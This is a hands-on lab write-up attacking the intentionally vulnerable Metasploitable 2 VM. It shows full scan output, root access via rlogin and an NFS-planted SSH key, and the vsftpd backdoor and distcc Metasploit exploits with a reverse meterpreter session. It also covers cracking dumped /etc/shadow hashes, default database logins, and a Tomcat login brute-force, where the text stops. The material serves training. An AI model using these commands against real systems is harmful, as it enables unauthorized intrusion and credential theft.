---
title: Working through Metasploitable 2
date: 2018-03-xx
---

## Introduction

Metasploitable 2 is an intentionally vulnerable Linux distribution, provided by the folks at Offensive Security, as a training tool for those looking to learn and develop there skills with the Metasploit framework.

-- #TODO: add a link to download. https://information.rapid7.com/metasploitable-download.html

This is an older environment, based on Ubuntu 8.04. It comes with a default username and password of `msfadmin` / `msfadmin` which can be used for anything really, but which I only used to log in and query the network address of the system (`172.16.243.143`), which was running as a VMWare VM with a host only network connection. This allowed me to then start probing the system from a fresh Kali Linux 2018.1 VM I had installed alongside of the Metasploitable host.

In this particular case, I chose to save time by just logging in to the target VM and enumerating it's IP address, since it should be one of only three hosts on my small host-only network created by VMWare (the others being the host itself, as well as the attacking Kali Linux VM).

Once I had the IP address, I took the step of adding that to my Kali `/etc/hosts` file, so that I could reference it by the name `target` rather than having to type out the IP address for every command.

    echo "172.16.243.143 target" >> /etc/hosts

## Scanning

A simple nmap scan resulted in the following results:

```
root@kali:~# nmap -n -Pn target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:06 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.0018s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:45:7D:7F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

A hint from other sources led me to add the `-p-` flag, which searches across all ports, rather than just the top 1000 as done by default. This resulted in a few extra high number ports >= 8787:

```
root@kali:~# nmap -n -Pn -p- target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:07 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.0019s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
36889/tcp open  unknown
45776/tcp open  unknown
49007/tcp open  unknown
51042/tcp open  unknown
MAC Address: 00:0C:29:45:7D:7F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
```

An even more detailed scan, adding the `-A` flag to perform OS and service fingerprinting, yielded even greater detail:

```
root@kali:~# nmap -n -Pn -p- -A target

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-25 17:08 EDT
Nmap scan report for target (172.16.243.143)
Host is up (0.00049s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 172.16.243.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2018-03-21T18:46:44+00:00; -4d02h24m03s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33371/udp  mountd
|   100005  1,2,3      45776/tcp  mountd
|   100021  1,3,4      42007/udp  nlockmgr
|   100021  1,3,4      51042/tcp  nlockmgr
|   100024  1          36889/tcp  status
|_  100024  1          52611/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    Java RMI Registry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, SupportsCompression, ConnectWithDatabase, LongColumnFlag, Speaks41ProtocolNew, SwitchToSSLAfterHandshake
|   Status: Autocommit
|_  Salt: QA3w$GyLQ3GL(!m%knh?
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2018-03-21T18:46:44+00:00; -4d02h24m03s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36889/tcp open  status      1 (RPC #100024)
45776/tcp open  mountd      1-3 (RPC #100005)
49007/tcp open  java-rmi    Java RMI Registry
51042/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:45:7D:7F (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -4d02h24m03s, deviation: 0s, median: -4d02h24m03s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-03-21T14:46:41-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 172.16.243.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.93 seconds
```

## Exploitation

### rlogin

The first service that I poked at was the rlogin service, allowing remote login to the system via port 513. This required installing the rsh client:

```
root@kali:~# apt install rsh-client

```

... but once installed, it was trivial to log in to the system:

```
root@kali:~# rlogin target
Last login: Wed Mar 21 14:44:41 EDT 2018 from 172.16.243.144 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:~# hostname
metasploitable
```

### NFS

Another service that was seen running, was the NFS service on port 2049.

After installing the `nfs-common` package:

```
root@kali:~# apt install nfs-common
```

I was able to exam the NFS exports of the target by utilizing the `showmount` command:

```
root@kali:~# showmount -e target
Export list for target:
/ *
```

This is particularly dangerous, as it allows any system to mount the root filesystem of the target system. Doing so, it was possible to make any arbitrary changes and exfilitration from the target system:

```
root@kali:~# mount -t nfs target:/ /mnt
root@kali:~# ls -l /mnt
total 96
drwxr-xr-x  2 root root  4096 May 13  2012 bin
drwxr-xr-x  3 root root  4096 Apr 28  2010 boot
lrwxrwxrwx  1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  2 root root  4096 Apr 28  2010 dev
drwxr-xr-x 94 root root  4096 Mar 21 14:57 etc
drwxr-xr-x  6 root root  4096 Apr 16  2010 home
drwxr-xr-x  2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx  1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x 13 root root  4096 May 13  2012 lib
drwx------  2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x  4 root root  4096 Mar 16  2010 media
drwxr-xr-x  3 root root  4096 Apr 28  2010 mnt
-rw-------  1 root root  5821 Mar 21 14:15 nohup.out
drwxr-xr-x  2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x  2 root root  4096 Apr 28  2010 proc
drwxr-xr-x 13 root root  4096 Mar 21 14:15 root
drwxr-xr-x  2 root root  4096 May 13  2012 sbin
drwxr-xr-x  2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  2 root root  4096 Apr 28  2010 sys
drwxrwxrwt  4 root root  4096 Mar 21 14:46 tmp
drwxr-xr-x 12 root root  4096 Apr 28  2010 usr
drwxr-xr-x 14 root root  4096 Mar 17  2010 var
lrwxrwxrwx  1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
```

One way, suggested by the Metasploitable guide, which I had read a bit up to this point, suggested to add an SSH key to the `/root/.ssh/authorized_keys` file on the target, thus allowing direct SSH access into the system.

Step 1: Create a new SSH key on my attacking host

```
root@kali:~# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:oEBiBWG7u5H+iq5iHqF+LZxA0YgU8p7j5L//2DoiP3w root@kali
The key's randomart image is:
+---[RSA 2048]----+
|=BO.             |
|=*..             |
| .+   .          |
| o.o . .         |
|.o= .   S        |
|.=+.             |
|.==.o            |
|=.=*+.Eo         |
|OB++=*++o        |
+----[SHA256]-----+
```

Step 2: Install the key onto the target over the NFS root mount

```
root@kali:~# ll /mnt/root/.ssh/authorized_keys
-rw-r--r-- 1 root root 405 May 17  2010 /mnt/root/.ssh/authorized_keys
root@kali:~#
root@kali:~# cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
root@kali:~#
root@kali:~# cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
root@kali:~#
root@kali:~# cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0kBlVF5lXk0vwB7cnOwsIZQOHzoAjkBh+sVZ0IeiUuW9afsSnEA56PGPh5rULNMhEI9fpCzu6nYpu1gA7i/F6in4Pd3UilRPH17cmqHCwfASSN03BTPypdRSSwyHamaTGarop2ZTeeuO+DxSx86FVwTo1LKsfal5rHI86y81zFrWb5Z3TDKPvEog47/3kMdEyYerXxYu/YT3JbaP6BQQo9+OfDa/PI4Qd5Q8aY0cIMUW/RGVnT5ERbGcNk/5TpZRoYVmnvvLyIG+xdGL82xG0brpcmYBi8Njla39mqOjWodjRg/CNbGk5QZI2CG5CdnuI3VbdSwTZovW79xTTKaHf root@kali
```

Step 3: SSH in to the target system

```
root@kali:~# ssh target
The authenticity of host 'target (172.16.243.143)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'target,172.16.243.143' (RSA) to the list of known hosts.
Last login: Wed Mar 21 14:49:58 2018 from 172.16.243.144
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:~# hostname
metasploitable
```

### Metasploitable Root shell

While perusing the open ports on the target VM, one in particular jumped out:

```
1524/tcp  open  shell       Metasploitable root shell
```

This was a curiousity... My first attempt was to attempt using rlogin to connect to the port, which did not appear to work correctly, though did seem to work enough to return part of a prompt to the user:

```
root@kali:~# rlogin -p 1524 target
oot@metasploitable:/#

ls
^C
root@kali:~# rlogin -p 1524 target
oot@metasploitable:/# id
;
^C
```

My next approach was to attempt a simple netcat connection to the host, which ended up being successful:

```
root@kali:~# nc -v target 1524
target [172.16.243.143] 1524 (ingreslock) open
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:/# hostname
metasploitable
```

### FTP

Another port that stood out was the FTP port 21, which was shown with the `nmap ... -A` command to allow anonymous logins:

```
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 172.16.243.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```

After installing the ftp client into my Kali Linux attack box:

```
root@kali:~# apt install ftp
```

This allowed authentication with any username and password combination, in my case, I chose `anonymous` / `anonymous`:

```
root@kali:~# ftp target
Connected to target.
220 (vsFTPd 2.3.4)
Name (target:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Poking around however, it appears that there aren't any files available for pilfering:

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
257 "/"
ftp>
```

Additionally, it appeared that there wasn't any opportunity to upload files, such as a `test` file that had been created:

```
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
553 Could not create file.
```

That called for a different approach, which led me to search in the `searchsploit` exploit-db databse for the service `vsftpd`:

```
root@kali:~# searchsploit vsftpd
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------
vsftpd 2.0.5 - 'CWD' Authenticated Remote Memory Consumption                      | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                    | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                    | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                  | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------------- ----------------------------------
```

Jackpot! It appears that there is an exploit available for the particular version, 2.3.4, which is installed on this server. I decided at this point to migrate to using metasploit (this is "metasploit"able after all...) and use it to gain access to the system.

```
root@kali:~# msfconsole
...
msf > search vsftpd
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution


msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.16.243.143
RHOST => 172.16.243.143
msf exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 172.16.243.143:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.243.143:21 - USER: 331 Please specify the password.
[+] 172.16.243.143:21 - Backdoor service has been spawned, handling...
[+] 172.16.243.143:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.16.243.144:33661 -> 172.16.243.143:6200) at 2018-03-25 17:55:42 -0400

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

At this point, I decided to attempt upgrading my session in Metasploit to a meterpreter session, successfully accomplishing this via:

```
^Z
Background session 2? [y/N]  y

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.16.243.144:4433
[*] Sending stage (857352 bytes) to 172.16.243.143
[*] Meterpreter session 3 opened (172.16.243.144:4433 -> 172.16.243.143:49559) at 2018-03-25 17:59:32 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
```

#### Password Cracking the Local System Accounts

This allowed me to connect to the system via meterpreter, and download the `/etc/passwd` and `/etc/shadow` files:

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> passwd
[*] Downloaded 1.54 KiB of 1.54 KiB (100.0%): /etc/passwd -> passwd
[*] download   : /etc/passwd -> passwd
meterpreter > download /etc/shadow
[*] Downloading: /etc/shadow -> shadow
[*] Downloaded 1.18 KiB of 1.18 KiB (100.0%): /etc/shadow -> shadow
[*] download   : /etc/shadow -> shadow
```

Which I was then able to combine using the `unshadow` command, and crack using John the Ripper:

```
root@kali:~# unshadow passwd shadow > target_unshadowed.txt

root@kali:~# john target_unshadowed.txt
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
msfadmin         (msfadmin)
service          (service)
123456789        (klog)
batman           (sys)
6g 0:00:01:22  3/3 0.07256g/s 40533p/s 40534c/s 40534C/s juadlyf..juadlin
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

root@kali:~# john --show
Password files required, but none specified

root@kali:~# john --show target_unshadowed.txt
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
service:service:1002:1002:,,,:/home/service:/bin/bash

6 password hashes cracked, 1 left
```

This provided several basic passwords that could then be used to break into the system, e.g. via the standard SSH service.

| Username | Password |
| --- | --- |
| sys | batman |
| klog | 123456789 |
| msfadmin | msfadmin |
| postgres | postgres |
| user | user |
| service | service |

### telnet

Next, now that I had gotten a few passwords for the system, I turned to the telnet service to attempt to login directly to the system (e.g. using credentials `msfadmin` / `msfadmin` as shown on the Message of the Day banner), testing and confirming, that `msfadmin` had root access to the system:

```
root@kali:~# telnet target
Trying 172.16.243.143...
Connected to target.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password:
Last login: Wed Mar 21 14:31:57 EDT 2018 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
msfadmin@metasploitable:~$ hostname
metasploitable
msfadmin@metasploitable:~$ sudo su -
[sudo] password for msfadmin:
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### MySQL

The next service that I went after was the `mysql` service running on the host. The default credentials for that service can sometimes be username `root` with no password. In this case, it appeared that this default credential was in fact a viable option.

```
root@kali:~# mysql -u root -h target
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set (0.00 sec)
```

This actually allowed me to see several users that were established in the MySQL database:

```
MySQL [(none)]> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| func                      |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| proc                      |
| procs_priv                |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
17 rows in set (0.00 sec)

MySQL [mysql]> select host, user, password from user;
+------+------------------+----------+
| host | user             | password |
+------+------------------+----------+
|      | debian-sys-maint |          |
| %    | root             |          |
| %    | guest            |          |
+------+------------------+----------+
3 rows in set (0.00 sec)
```

### PostgreSQL

Another database running on the target server was the postgresql database service. This was one that actually showed up when dumping and cracking the user account credentials earlier. By logging in with those credentials (`postgres` / `postgres`), it was possible to query the database for the users and their permissions, in this case there was only the one user, "postgres", a superuser for the database application.

```
root@kali:~# psql -h target -U postgres
Password for user postgres:
psql (10.1, server 8.3.1)
SSL connection (protocol: TLSv1, cipher: DHE-RSA-AES256-SHA, bits: 256, compression: off)
Type "help" for help.

postgres=# \du
                       List of roles
 Role name |            Attributes             | Member of
-----------+-----------------------------------+-----------
 postgres  | Superuser, Create role, Create DB | {}

```

### distccd

On a whim, I looked randomly at the `distccd` service running on port 3632 of the target system. A search in `searchsploit` didn't result in any hits:

```
root@kali:~# searchsploit distccd
-------------------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                                |  Path
                                                                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------- ----------------------------------
-------------------------------------------------------------------------------------------------------------- ----------------------------------
```

But a search in Metasploit found an exploit for the DistCC Daemon. Unfortunately, it did not include any information about what versions this exploit would impact, but a shot-in-the-dark to run the exploit ended up successfully returning a shell:

```
msf > search distccd
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                           Disclosure Date  Rank       Description
   ----                           ---------------  ----       -----------
   exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution



msf > use exploit/unix/misc/distcc_exec
msf exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 172.16.243.144:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo dvVvr9yfS55bmx5j;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "dvVvr9yfS55bmx5j\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 4 opened (172.16.243.144:4444 -> 172.16.243.143:35054) at 2018-03-25 18:45:45 -0400

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
hostname
metasploitable
```

### Apache Tomcat/Coyote JSP engine 1.1

Another service to look at was the Apache tomcat web server running on port 8180.

```
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
```

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
rport => 8180
msf auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 172.16.243.143:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
